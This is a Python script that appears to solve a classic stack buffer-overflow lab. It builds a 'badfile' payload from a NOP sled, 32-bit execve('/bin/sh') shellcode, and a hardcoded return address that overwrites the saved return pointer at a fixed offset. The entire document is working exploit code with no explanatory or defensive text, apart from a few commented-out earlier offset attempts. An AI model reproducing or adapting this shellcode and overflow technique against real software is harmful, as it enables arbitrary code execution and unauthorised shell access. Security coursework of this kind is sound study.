import sys 
 
shellcode= ( 
"\x31\xc0" 
"\x50"  
"\x68""//sh" 
"\x68""/bin" 
"\x89\xe3" 
"\x50" 
"\x53" 
"\x89\xe1" 
"\x99" 
"\xb0\x0b" 
"\xcd\x80" 
).encode('latin-1') 

badfile_string_size = 1049
return_distance_from_buffer = 755+4
ebp = 0xffffc728
 
# Fill the content with NOPs 
content = bytearray(0x90 for i in range(badfile_string_size)) 
# Put the shellcode at the end 
# start = badfile_string_size - len(shellcode) 
# content[start:] = shellcode 

start = 200
content[start:start+len(shellcode)] = shellcode

# Put the address at offset 112 
# ret = 0xffffd358 + 250  

ret = ebp - 600
content[return_distance_from_buffer:return_distance_from_buffer+4] = (ret).to_bytes(4,byteorder='little') 
 
# Write the content to a file 
with open('badfile', 'wb') as f: 
    f.write(content) 
